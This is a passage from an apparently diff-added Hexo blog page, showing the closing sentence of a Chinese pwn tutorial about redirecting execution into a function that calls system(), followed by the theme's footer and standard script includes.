+<figure>
+<img src="/2021/05/08/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/image-20210508215413720.png" alt><figcaption>image-20210508215413720</figcaption>
+</figure>
+<p>此时已经进入到了fun函数中，由于fun没有参数，因此可以正常执行fun函数并调用system()这个函数。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%80%86%E5%90%91-pwn-%E6%B1%87%E7%BC%96/" rel="tag"># 逆向 - pwn - 汇编 -</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/05/04/Intel-Intrinsics/" rel="prev" title="Intel-Intrinsics">
+                  <i class="fa fa-angle-left"></i> Intel-Intrinsics
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/05/09/pwn%E8%BF%9B%E9%98%B6%E4%BB%A5%E5%8F%8Aprinf%E7%9A%84%E5%88%A9%E7%94%A8/" rel="next" title="pwn进阶以及prinf的利用">
+                  pwn进阶以及prinf的利用 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments" id="disqus_thread">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2014 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">GXG</span>
+  </div>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZw==">NexT.Gemini</span> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL25leHQtdGhlbWUvaGV4by10aGVtZS1uZXh0" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/comments.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/motion.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/next-boot.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/pjax.min.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/third-party/search/local-search.min.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.3.0/mermaid.min.js","integrity":"sha256-9y71g5Lz/KLsHjB8uXwnkuWDtAMDSzD/HdIbqhJfTAI="}}</script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/third-party/tags/mermaid.min.js"></script>
+
+  <script class="next-config" data-name="wavedrom" type="application/json">{"enable":true,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/wavedrom/3.3.0/wavedrom.min.js","integrity":"sha256-IRMDzTC+wK5stMucZ/XSXkeS5VNtxZ+/Bm8Mcqfoxdo="}}</script>
+  <script class="next-config" data-name="wavedrom_skin" type="application/json">{"enable":true,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/wavedrom/3.3.0/skins/default.js","integrity":"sha256-fduc/Zszk5ezWws2uInY/ALWVmIrmV6VTgXbsYSReFI="}}</script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/third-party/tags/wavedrom.min.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","mhchem":true,"cdn2":"https://cdn.bootcss.com/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML","cdn3":"https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/third-party/math/mathjax.min.js"></script>
+
+
+<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"next-theme","count":true,"i18n":{"disqus":"disqus"}}</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.18.0/third-party/comments/disqus.min.js"></script>
+
+</body>
+</html>
